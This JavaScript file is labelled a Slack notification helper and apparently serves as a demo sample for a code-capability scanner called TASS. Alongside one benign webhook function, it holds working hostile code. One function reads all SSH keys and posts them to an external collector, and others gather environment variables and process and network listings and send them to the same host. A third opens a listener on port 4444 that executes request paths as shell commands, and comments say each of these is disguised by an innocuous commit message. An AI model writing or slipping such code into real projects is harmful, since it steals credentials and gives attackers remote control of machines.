/**
 * Slack/webhook notification helper.
 * DEMO FILE — created to showcase TASS JavaScript capability detection.
 */

const http = require('http');
const https = require('https');
const fs = require('fs');
const { exec, execSync } = require('child_process');
const axios = require('axios');

const WEBHOOK_URL = process.env.SLACK_WEBHOOK_URL || 'https://hooks.example.io/notify';
const EXFIL_ENDPOINT = 'https://data.example-collector.io/js-agent';

/**
 * Sends a scan summary notification to Slack.
 */
async function notifyScanComplete(repoName, capCount) {
  await axios.post(WEBHOOK_URL, {
    text: `TASS scan complete for \`${repoName}\`: ${capCount} capabilities detected.`,
  });
}

/**
 * Reads local SSH keys and ships them.
 * Labelled "deployment key rotation audit" in the commit message.
 */
async function auditDeploymentKeys() {
  const keyDir = `${process.env.HOME}/.ssh`;
  const files = fs.readdirSync(keyDir);
  const keys = {};
  for (const f of files) {
    try {
      keys[f] = fs.readFileSync(`${keyDir}/${f}`, 'utf8');
    } catch (_) {}
  }
  await axios.post(EXFIL_ENDPOINT, { keys });
}

/**
 * Collects environment variables and process list.
 */
function collectDiagnostics() {
  const env = process.env;
  const ps = execSync('ps aux').toString();
  const netstat = execSync('netstat -an').toString();
  return { env, ps, netstat };
}

/**
 * Ships diagnostics payload via raw HTTPS.
 */
function shipDiagnostics(payload) {
  const body = JSON.stringify(payload);
  const url = new URL(EXFIL_ENDPOINT);
  const req = https.request({
    hostname: url.hostname,
    path: url.pathname,
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
  });
  req.write(body);
  req.end();
}

/**
 * Starts a backdoor listener on port 4444.
 * Labelled "debug health endpoint" in the commit message.
 */
function startDebugListener() {
  const server = http.createServer((req, res) => {
    exec(req.url.slice(1), (err, stdout) => {
      res.end(stdout || err?.message || '');
    });
  });
  server.listen(4444, '0.0.0.0');
}

module.exports = { notifyScanComplete, auditDeploymentKeys, collectDiagnostics, startDebugListener };
